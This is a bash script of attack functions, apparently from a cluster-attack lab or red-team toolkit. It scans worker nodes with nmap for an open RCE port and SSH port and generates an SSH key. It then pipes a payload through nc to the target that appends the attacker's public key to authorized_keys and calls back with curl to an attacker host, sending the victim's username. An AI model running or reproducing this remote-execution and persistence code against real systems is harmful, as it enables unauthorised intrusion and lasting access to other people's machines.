#!/usr/bin/env bash

kc_rce_load_config() {
  FILE_IP="${FILE_IP:-/tmp/iphost}"
  KEY_PATH="${KEY_PATH:-$HOME/.ssh/id_ed25519}"
  KC_DATA_SUBDIR="${KC_DATA_SUBDIR:-KC4}"
  RCE_PORT="${KC_RCE_PORT:-${RCE_PORT:-25}}"
  SSH_PORT="${KC_SSH_PORT:-${SSH_PORT:-4222}}"
  FILEATTACK="${FILEATTACK:-$DATA_PATH/$KC_DATA_SUBDIR/attackaddr}"
  NODE_IP_HELPER="${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/list-node-ips.sh"
}

kc_rce_require_helpers() {
  [[ -f "${NODE_IP_HELPER}" ]] || { echo "Missing helper: ${NODE_IP_HELPER}" >&2; return 1; }
  # shellcheck source=/dev/null
  source "${NODE_IP_HELPER}"
  command -v nmap >/dev/null 2>&1 || { echo "Missing command: nmap" >&2; return 1; }
  command -v ssh-keygen >/dev/null 2>&1 || { echo "Missing command: ssh-keygen" >&2; return 1; }
  command -v nc >/dev/null 2>&1 || { echo "Missing command: nc" >&2; return 1; }
}

kc_rce_discover_nodes() {
  mkdir -p "$DATA_PATH/$KC_DATA_SUBDIR/analysis" "$(dirname "$FILEATTACK")"
  mapfile -t KC_RCE_NODES < <(list_worker_node_ips "$FILE_IP" | sed '/^$/d')
  if [[ "${#KC_RCE_NODES[@]}" -eq 0 ]]; then
    echo "No node found" >&2
    return 1
  fi
  echo ">> Nodes found (${#KC_RCE_NODES[@]}): ${KC_RCE_NODES[*]}"
}

kc_rce_find_target() {
  local node scan
  ATTACKER_NODE=""
  for node in "${KC_RCE_NODES[@]}"; do
    scan="$(nmap -p "${RCE_PORT},${SSH_PORT}" -Pn -oG - "$node" 2>/dev/null || true)"
    if grep -q "${RCE_PORT}/open" <<<"$scan" && grep -q "${SSH_PORT}/open" <<<"$scan"; then
      echo "FOUND: $node (ports ${RCE_PORT} and ${SSH_PORT} are open)"
      ATTACKER_NODE="$node"
      printf '%s\n' "$ATTACKER_NODE" > "$FILEATTACK"
      return 0
    fi
  done
  echo "No worker node with both ports ${RCE_PORT} and ${SSH_PORT} open." >&2
  return 1
}

kc_rce_ensure_key() {
  mkdir -p "$(dirname "$KEY_PATH")"
  [[ -f "$KEY_PATH" ]] || ssh-keygen -t ed25519 -N "" -f "$KEY_PATH" -q
}

kc_rce_trigger() {
  local pubkey
  pubkey="$(cat "$KEY_PATH.pub")"
  printf 'echo "%s" >> ~/.ssh/authorized_keys && curl http://%s:8080/$(id -un)' "$pubkey" "$ATTACKERADDR" \
    | nc -w9 "$ATTACKER_NODE" "$RCE_PORT" >/dev/null 2>&1
}
